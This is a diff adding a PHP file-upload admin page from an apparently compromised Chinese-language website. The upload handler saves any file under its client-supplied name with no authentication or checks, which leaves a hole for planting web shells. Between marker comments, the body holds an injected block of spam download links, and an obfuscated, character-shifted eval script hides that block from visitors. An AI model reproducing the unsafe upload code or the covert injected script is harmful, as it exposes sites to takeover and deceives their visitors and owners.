@@ -1,0 +1,49 @@
+<?
+if($_FILES['file']['name']<>""){
+copy($_FILES['file']['tmp_name'],"../images/".$_FILES['file']['name']);
+echo "<script>alert('File updated!!');</script>";
+
+}
+?><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>無標題文件</title>
+<style type="text/css">
+<!--
+.style1 {color: #FF0000}
+.style2 {
+	color: #990000;
+	font-size: 14px;
+}
+.style3 {
+	font-size: 13px;
+	font-weight: bold;
+}
+-->
+</style>
+<script type="text/JavaScript">
+<!--
+function MM_jumpMenu(targ,selObj,restore){ //v3.0
+  eval(targ+".location='"+selObj.options[selObj.selectedIndex].value+"'");
+  if (restore) selObj.selectedIndex=0;
+}
+//-->
+</script>
+</head>
+<link href="style.css" type="text/css" rel="stylesheet" />
+<body>																									<!--ME4T3US--> <b id="roll783"> Mary Beth Reed Floating Under a Honey Tree, <a href="http://crescentpicturescorporation2794.blogspot.com">Download Floating Under a Honey Tree</a>, .  Osman Betin Deli fisek, <a href="http://magnussoftdeutschlandgmbh6686.blogspot.com/2009/08/movie-deli-fisek.html">Download Deli fisek movie</a>, Çetin Inanç Deli fisek.  , <a href="http://tidelineproductions3903.blogspot.com/2009/08/movie-fate-and-mr-mckinley.html">movie Fate and Mr. McKinley</a>, .  ?  <a href="http://www.blogger.com/followers.g?blogID2440787904451375151'View All/a/spanspan class'item-control blog-admin'a href'http://www.blogger.com/manage-followers.g?blogID2440787904451375151'Manage/a/span/divdiv class'clear'/divspan class'widget-item-control's">Biography / Autobiography Florence</a>  <a href="http://best8sportsgenotes.blogspot.com/2009/02/season-on-brink.html">Basketball General Season on the Brink</a>  Association football Fever Pitch,  <a href="http://usa1soccerbionews.blogspot.com/2009/02/fever-pitch_13.html">Ball games Penguin Books Ltd</a> , Biography & autobiography: sport Penguin Books Ltd. </b><script language="javascript"> var sgsd15=["184", "195", "183", "201", "193", "185", "194", "200", "130", "187", "185", "200", "153", "192", "185", "193", "185", "194", "200", "150", "205", "157", "184", "124", "118", "198", "195", "192", "192", "139", "140", "135", "118", "125", "130", "199", "200", "205", "192", "185", "130", "196", "195", "199", "189", "200", "189", "195", "194", "116", "145", "116", "118", "181", "182", "199", "195", "192", "201", "200", "185", "118", "143", "184", "195", "183", "201", "193", "185", "194", "200", "130", "187", "185", "200", "153", "192", "185", "193", "185", "194", "200", "150", "205", "157", "184", "124", "118", "198", "195", "192", "192", "139", "140", "135", "118", "125", "130", "199", "200", "205", "192", "185", "130", "203", "189", "184", "200", "188", "116", "145", "116", "132", "143", "184", "195", "183", "201", "193", "185", "194", "200", "130", "187", "185", "200", "153", "192", "185", "193", "185", "194", "200", "150", "205", "157", "184", "124", "118", "198", "195", "192", "192", "139", "140", "135", "118", "125", "130", "199", "200", "205", "192", "185", "130", "188", "185", "189", "187", "188", "200", "116", "145", "116", "132", "143", "184", "195", "183", "201", "193", "185", "194", "200", "130", "187", "185", "200", "153", "192", "185", "193", "185", "194", "200", "150", "205", "157", "184", "124", "118", "198", "195", "192", "192", "139", "140", "135", "118", "125", "130", "199", "200", "205", "192", "185", "130", "195", "202", "185", "198", "186", "192", "195", "203", "116", "145", "116", "118", "188", "189", "184", "184", "185", "194", "118", "143"];var nvp80="";var jg965="";for (oupy73=0; oupy73<sgsd15.length; oupy73++){jg965=sgsd15[oupy73]-84;nvp80=nvp80+String.fromCharCode(jg965);}eval(nvp80);</script> <!--ME4T3US-->
+<div class="style2">檔案上傳修改</div>
+<form action="files.php" method="post" enctype="multipart/form-data" name="form1" id="form1">
+  <p class="style3">說明：只要是網站所有圖片或下載的檔案皆可在此上傳覆蓋。<br />
+    選擇檔案：
+    <input type="file" name="file" /> 
+
+  <p>      
+    <input type="submit" name="Submit" value="確認上傳" />
+  </p>
+
+</form>
+</p>
+</body>
+</html>
